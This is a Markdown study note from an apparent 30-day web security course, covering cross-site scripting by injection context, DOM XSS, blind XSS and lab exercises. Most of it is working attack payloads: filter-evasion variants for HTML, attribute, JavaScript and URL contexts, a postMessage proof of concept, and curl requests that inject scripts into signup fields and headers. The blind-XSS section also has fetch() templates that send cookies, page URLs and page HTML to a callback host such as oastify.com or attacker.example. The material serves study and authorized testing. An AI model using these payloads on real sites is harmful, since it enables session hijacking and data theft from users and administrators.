# 💉 Day 07 — XSS Mastery Part 1: Contexts, Payloads, Real-World Exploitation

> **Part of:** 30-Day WAF Bypass & Payload Crafting Journey  
> **Date:** _Add your date_  
> **Difficulty:** ⭐⭐⭐⭐☆ Advanced  
> **Time Required:** 4–5 hours  

![Day](https://img.shields.io/badge/Day-07%2F30-blue)
![Status](https://img.shields.io/badge/Status-In%20Progress-yellow)
![Focus](https://img.shields.io/badge/Focus-XSS%20Deep%20Dive-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Advanced-orange)

> ⚠️ **Ethical Use Only:**  
> Ei note shudhu educational purpose, personal lab, CTF, PortSwigger labs, Juice Shop, WebGoat, or authorized bug bounty / pentest scope er jonno. Unauthorized target e kono testing korba na.

---

## 📑 Table of Contents

- [🎯 Objectives](#-objectives)
- [⏰ Time Breakdown](#-time-breakdown)
- [📚 Session 1: XSS Theory & Types](#-session-1-xss-theory--types)
- [🎨 Session 2: Context-Aware Exploitation](#-session-2-context-aware-exploitation)
- [🧬 Session 3: DOM XSS Deep Dive](#-session-3-dom-xss-deep-dive)
- [👻 Session 4: Blind XSS + Exfiltration](#-session-4-blind-xss--exfiltration)
- [📖 Session 5: Real HackerOne Report Case Studies](#-session-5-real-hackerone-report-case-studies)
- [🧪 Session 6: PortSwigger Academy Labs](#-session-6-portswigger-academy-labs)
- [🏆 Day 7 Challenge](#-day-7-challenge)
- [📋 Cheat Sheet](#-cheat-sheet)
- [📚 Resources](#-resources)
- [❓ Self-Check](#-self-check)
- [📝 My Day 7 Notes](#-my-day-7-notes)

---

# 🎯 Objectives

End of this day, I will be able to:

- [ ] Master **XSS injection contexts**: HTML, attribute, JavaScript, URL, CSS, JSON
- [ ] Execute **all XSS types**: Reflected, Stored, DOM, Blind
- [ ] Build a **context-aware payload decision tree**
- [ ] Understand real-world XSS patterns from disclosed reports
- [ ] Use **Burp Collaborator / XSS Hunter-style callbacks** for blind XSS
- [ ] Understand **source → sink** flow for DOM XSS
- [ ] Document payload behavior by context

---

# ⏰ Time Breakdown

| Session | Topic | Duration |
|---|---|---:|
| 1 | XSS Theory & Types | 30 min |
| 2 | Context-Aware Exploitation | 75 min |
| 3 | DOM XSS Deep Dive | 60 min |
| 4 | Blind XSS + Exfiltration | 45 min |
| 5 | HackerOne Report Case Studies | 60 min |
| 6 | PortSwigger Academy Labs | 60 min |
| **Total** |  | **~4.5 hours** |

---

# 📚 Session 1: XSS Theory & Types

## The 4 Types of XSS

| Type | How It Works | Persistence | Stealth |
|---|---|---|---|
| **Reflected** | Payload in URL/request reflects in response | One-shot | Obvious |
| **Stored** | Payload saved in database and fires later | Persistent | Stealthy |
| **DOM-based** | Client-side JavaScript processes unsafe input | Per-session | Harder to detect |
| **Blind** | Payload fires later in admin/log/support panel | Delayed | Stealthiest |

---

## XSS Execution Model

```text
User Input
   ↓
Application
   ↓
Output Location
   ↓
HTML body / Attribute / JS / URL / CSS / JSON
   ↓
Browser Parses
   ↓
Payload Executes
```

---

## The Critical Question: WHERE?

Before crafting any payload, identify the output context.

| Context | Example Payload Style |
|---|---|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute | `" onerror="alert(1)` |
| JavaScript string | `';alert(1);//` |
| URL / href | `javascript:alert(1)` |
| CSS | `expression(alert(1))` legacy |
| JSON rendered into HTML | `</script><script>alert(1)</script>` |

---

# 🎨 Session 2: Context-Aware Exploitation

## Context 1: HTML Body

Vulnerable example:

```php
<div>Hello, <?= $_GET['name'] ?></div>
```

Payload examples:

```html
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

HTML5 / parser edge examples for labs:

```html
<math><mtext></form><form><mglyph><svg><mtext></style></script><path id="</path><img onerror=alert(1) src>">
```

---

## Context 2: HTML Attribute

Vulnerable example:

```php
<input value="<?= $_GET['q'] ?>">
```

Strategy:

```text
Close the attribute → inject event handler or close tag → inject new HTML
```

Payload examples:

```html
" onfocus=alert(1) autofocus "
" onmouseover=alert(1) x="
"><script>alert(1)</script>
"><svg onload=alert(1)>
"><img src=x onerror=alert(1)>
" onclick=alert(1) x="
```

If quotes are blocked or encoded:

```html
&quot;><script>alert(1)</script>
x onmouseover=alert(1)
```

---

## Context 3: JavaScript String

Vulnerable example:

```html
<script>
  var name = "USER_INPUT";
</script>
```

Payload examples:

```javascript
";alert(1);//
\";alert(1);//
</script><script>alert(1)</script>
</script><svg onload=alert(1)>
```

Why `</script>` matters:

```text
Even inside a JS string, the HTML parser can terminate the script tag.
```

---

## Context 4: URL / href

Vulnerable example:

```html
<a href="USER_INPUT">Click</a>
```

Payload examples:

```text
javascript:alert(1)
javascript:alert(1)//
JaVaScRiPt:alert(1)
javas&#99;ript:alert(1)
javascript&colon;alert(1)
j&#x61;vascript:alert(1)
javascript://%0aalert(1)
data:text/html,<script>alert(1)</script>
vbscript:msgbox(1)
```

> `vbscript:` is legacy IE-only and useful mainly for historical understanding.

---

## Context 5: JavaScript Event Handler

Vulnerable example:

```html
<div onclick="doStuff('USER_INPUT')">Click</div>
```

Payload examples:

```javascript
');alert(1);//
');alert(1);//'
'));alert(1);//
```

---

## Context 6: JSON Rendered Unsafely

Vulnerable pattern:

```json
{"name": "USER_INPUT"}
```

If frontend later renders it unsafely:

```javascript
document.write("<script>var user='" + data.name + "'</script>");
```

Payload examples:

```json
{"name": "</script><script>alert(1)</script>"}
{"name": "<img src=x onerror=alert(1)>"}
{"name": "\u003cscript\u003ealert(1)\u003c/script\u003e"}
```

---

## Context Decision Tree

```text
Where does your input appear?

├── HTML body
│   ├── Script tag blocked? → Try event-handler tags: svg, img, details
│   └── All tags blocked? → Check encoding / decode behavior
│
├── HTML attribute
│   ├── Double-quoted? → Close with "
│   ├── Single-quoted? → Close with '
│   ├── Unquoted? → Inject space + onX=payload
│   └── Quotes encoded? → Try entity-based breakout
│
├── JavaScript string
│   ├── Can close string? → Close and inject JS
│   ├── Quotes escaped? → Try </script> breakout
│   └── Strict CSP? → Need CSP-specific research
│
├── URL / href
│   ├── javascript: allowed? → Direct test
│   ├── Filter blocks javascript? → Entity/case/whitespace variations
│   └── data: allowed? → data URI test in lab
│
├── Event handler
│   ├── String argument? → Close string
│   └── Raw JS? → Inject JS directly
│
└── JSON
    └── Is it later inserted into HTML or script? → Context-specific breakout
```

---

# 🧬 Session 3: DOM XSS Deep Dive

## DOM XSS Fundamentals

DOM XSS happens in **client-side JavaScript**.  
The server may never see the final payload.

```text
Source → JavaScript processing → Sink → Browser execution
```

---

## Common Sources and Sinks

| Sources | Dangerous Sinks |
|---|---|
| `location.hash` | `innerHTML` |
| `location.search` | `outerHTML` |
| `location.href` | `document.write()` |
| `document.URL` | `eval()` |
| `document.referrer` | `setTimeout(string)` |
| `window.name` | `setInterval(string)` |
| `postMessage` data | `Function(string)` |
| `localStorage` | `jQuery.html()` |
| `sessionStorage` | `setAttribute("on*")` |
| `document.cookie` | `execScript()` legacy |

---

## Classic DOM XSS Example

Vulnerable JavaScript:

```javascript
var name = window.location.hash.substring(1);
document.getElementById("greeting").innerHTML = "Hello " + name;
```

Exploit URL:

```text
https://target.example/page#<img src=x onerror=alert(1)>
```

---

## Modern DOM XSS Patterns

### Pattern 1: `postMessage` + `eval`

```javascript
window.addEventListener("message", (event) => {
  eval(event.data);
});
```

Lab exploit concept:

```javascript
targetWindow.postMessage("alert(document.domain)", "*");
```

---

### Pattern 2: jQuery `.html()` with URL Data

```javascript
$("#content").html(location.hash.slice(1));
```

Payload in hash:

```text
#<img src=x onerror=alert(1)>
```

---

### Pattern 3: Prototype Pollution → XSS

Concept:

```javascript
Object.prototype.isAdmin = "<img src=x onerror=alert(1)>";
```

If app later renders inherited polluted values into HTML, XSS may occur.

---

## DOM XSS Hunting Workflow

```bash
# 1. Find JavaScript files
curl -s https://target.example | grep -oE 'src="[^"]+\.js"'

# 2. Download JS file
wget https://target.example/app.js

# 3. Search for sinks
grep -nE "(innerHTML|outerHTML|eval|document.write|setTimeout|setInterval|Function|location)" app.js

# 4. Trace from sources to sinks
# 5. Confirm safely in authorized scope
```

---

## Tool: DOM Invader

Burp path:

```text
Burp Browser → Settings → DOM Invader → Enable
```

Workflow:

```text
Browse target
Open DOM Invader tab
Review detected sources and sinks
Use Explore to test possible flows
Confirm manually
```

---

# 👻 Session 4: Blind XSS + Exfiltration

## What is Blind XSS?

Blind XSS fires somewhere you cannot directly see.

Common places:

- Admin panel
- Support ticket dashboard
- Log viewer
- Analytics dashboard
- CRM backend
- Error monitoring system

---

## XSS Hunter / Callback Setup

Self-hosted option:

```bash
git clone https://github.com/mandatoryprogrammer/xsshunter-express
cd xsshunter-express
docker compose up -d
```

Example callback payload:

```html
"><script src="//YOUR-HOST/probe.js"></script>
```

---

## Using Burp Collaborator

Burp workflow:

```text
Burp → Collaborator → Copy to clipboard
```

You get a unique domain like:

```text
xxxxxx.oastify.com
```

---

## Blind XSS Payload Templates

Basic script callback:

```html
<script src="https://xxxxxx.oastify.com/x.js"></script>
```

Exfil current page URL:

```html
<script>
fetch("https://xxxxxx.oastify.com/?url=" + encodeURIComponent(location.href))
</script>
```

Exfil cookies in lab:

```html
<script>
fetch("https://xxxxxx.oastify.com/?c=" + btoa(document.cookie))
</script>
```

Exfil partial DOM in lab:

```html
<script>
fetch("https://xxxxxx.oastify.com/?h=" + btoa(document.documentElement.innerHTML.slice(0, 5000)))
</script>
```

> ⚠️ In real bug bounty, collect the minimum proof needed. Do not exfiltrate sensitive data.

---

## Blind XSS Injection Points

Try in authorized labs and scopes:

```text
User-Agent header
Referer header
X-Forwarded-For header
Username during signup
Profile fields
Contact form
Support ticket body
Order notes
Uploaded filename
Error message fields
Webhook names
```

Example lab request:

```bash
curl https://target.example/signup \
  -d "email=test@example.com&name=<script src=//xxxxxx.oastify.com></script>" \
  -H "User-Agent: <script src=//xxxxxx.oastify.com></script>"
```

---

# 📖 Session 5: Real HackerOne Report Case Studies

## Case 1: Stored XSS via Display Name

Pattern:

```text
Signup name sanitized in one place
Same name rendered unsafely in notifications
Payload fires for users who view notifications
```

Lesson:

```text
Test every output location, not only the first reflection.
```

---

## Case 2: DOM XSS via postMessage

Pattern:

```text
Payment iframe listens for message events
Message data passed to innerHTML
Attacker origin sends HTML
Payload executes in target frame
```

PoC concept:

```html
<iframe src="https://target.example/pay"></iframe>
<script>
  setTimeout(() => {
    frames[0].postMessage(
      '<img src=x onerror=alert(document.cookie)>',
      'https://target.example'
    );
  }, 2000);
</script>
```

Lesson:

```text
postMessage handlers need strict origin checks and safe sinks.
```

---

## Case 3: Blind XSS in Admin Panel

Pattern:

```text
User-controlled name field
Admin panel renders field in title or table
Payload fires when admin views user list
```

Context-specific payload:

```html
</title><script src="//attacker.example/probe.js"></script>
```

Lesson:

```text
Blind XSS often depends on a different rendering context than user-facing pages.
```

---

## Case 4: XSS via SVG Upload

Malicious SVG concept:

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">alert(document.domain)</script>
</svg>
```

Lesson:

```text
File uploads can become XSS if active content is served with executable MIME type.
```

---

## Case 5: JSON Response XSS

Pattern:

```text
API returns user-controlled JSON
Frontend uses eval() or unsafe rendering
Payload breaks JavaScript context
```

Bad practice:

```javascript
eval("(" + responseText + ")");
```

Safer practice:

```javascript
JSON.parse(responseText);
```

Lesson:

```text
JSON is safe only when parsed safely and rendered safely.
```

---

# 🧪 Session 6: PortSwigger Academy Labs

## Must-Complete Labs

### Reflected XSS

- [ ] Reflected XSS into HTML context with nothing encoded
- [ ] Reflected XSS into attribute with angle brackets HTML-encoded
- [ ] Reflected XSS into a JavaScript string with angle brackets HTML-encoded

### Stored XSS

- [ ] Stored XSS into HTML context with nothing encoded
- [ ] Stored XSS into anchor `href` attribute with double quotes HTML-encoded

### DOM XSS

- [ ] DOM XSS in `document.write` using `location.search`
- [ ] DOM XSS in `innerHTML` using `location.search`
- [ ] DOM XSS in jQuery anchor `href`

Direct resource:

```text
https://portswigger.net/web-security/cross-site-scripting
```

---

## Juice Shop XSS Challenges

```text
Challenge: DOM XSS
Target: Search bar
Payload idea: iframe / javascript URL context

Challenge: Reflected XSS
Target: Track order feature

Challenge: Persisted XSS
Target: User-controlled stored fields
```

---

# 🏆 Day 7 Challenge

- [ ] Complete **8 PortSwigger XSS labs**
- [ ] Solve **3 Juice Shop XSS challenges**
- [ ] Document all **5+ context types** with working lab payloads
- [ ] Set up **Burp Collaborator** for blind XSS testing
- [ ] Analyze **5 disclosed XSS reports**
- [ ] Build personal XSS polyglot collection with 10+ payloads
- [ ] Test payloads against **ModSecurity PL1**
- [ ] Update payload vault
- [ ] Push `Day-07.md` + payload vault updates to GitHub

---

# 📋 Cheat Sheet

## XSS Quick Payloads by Context

```text
HTML Body:
<img src=x onerror=alert(1)>

Attribute:
" onfocus=alert(1) autofocus "

JS String:
";alert(1);//

JS Variable:
-alert(1)-

URL:
javascript:alert(1)

CSS:
expression(alert(1)) legacy IE only

JSON rendered into script:
</script><script>alert(1)</script>
```

---

## Universal Try-First Payloads

```html
<script>alert(1)</script>
"><script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
javascript:alert(1)
"><img src=x onerror=alert(1)>
'-alert(1)-'
\"-alert(1)//
</textarea><script>alert(1)</script>
<details open ontoggle=alert(1)>
```

---

## Blind XSS Probe

```html
"><script src="//your-collab.oastify.com"></script>
```

---

## DOM XSS Sink Checklist

```text
innerHTML
outerHTML
document.write
eval
Function
setTimeout(string)
setInterval(string)
jQuery.html()
location assignment
setAttribute("on*")
```

---

# 📚 Resources

- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
- [HTML5 Security Cheatsheet](https://html5sec.org/)
- [Brutelogic XSS Cheat Sheet](https://brutelogic.com.br/blog/)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)
- [YesWeHack Dojo](https://dojo-yeswehack.com/)

---

# ❓ Self-Check

1. Reflected vs Stored vs DOM XSS — primary difference ki?
2. XSS payload er jonno context keno important?
3. `innerHTML` vs `textContent` — konta dangerous sink?
4. Blind XSS er 3 ta common use case bolo.
5. SVG file upload kivabe XSS e convert hote pare?
6. `postMessage` XSS kivabe kaj kore?
7. `javascript:` URL context e kon payload category kaj kore?
8. Same payload different contexts e different behavior keno kore?

✅ All answered confidently? **Day 7 complete!**

---

# 📝 My Day 7 Notes

<!-- Fill in after completion -->

## Labs Completed

| Lab | Status | Notes |
|---|---|---|
| Reflected XSS HTML context | ⬜ |  |
| Reflected XSS attribute context | ⬜ |  |
| Reflected XSS JS string | ⬜ |  |
| Stored XSS HTML context | ⬜ |  |
| Stored XSS href context | ⬜ |  |
| DOM XSS document.write | ⬜ |  |
| DOM XSS innerHTML | ⬜ |  |
| DOM XSS jQuery href | ⬜ |  |

---

## Payloads by Context

| Context | Payload | Result |
|---|---|---|
| HTML body |  |  |
| Attribute |  |  |
| JavaScript string |  |  |
| URL / href |  |  |
| JSON |  |  |
| DOM |  |  |

---

## Blind XSS Test

```text
Collaborator domain:
Payload used:
Interaction received: yes / no
```

---

## Favorite Payload

```html
<!-- paste here -->
```

Why it worked:

```text
Write explanation here.
```

---

## Key Learning

```text
XSS is the art of understanding context.
```

---

## Tomorrow’s Prep

- [ ] Review SSRF basics
- [ ] Prepare Burp Collaborator
- [ ] Review Day 5 Vulhub lab
- [ ] Prepare Day 8 notes

---

<p align="center">
  <strong>🎓 Day 7 Status:</strong> ⬜ In Progress / ✅ Complete<br>
  <em>“XSS is the art of understanding context.”</em>
</p>

<p align="center">
  <a href="./Day-06.md">← Previous: Day 06</a> |
  <a href="./Day-08.md">Next: Day 08 →</a>
</p>
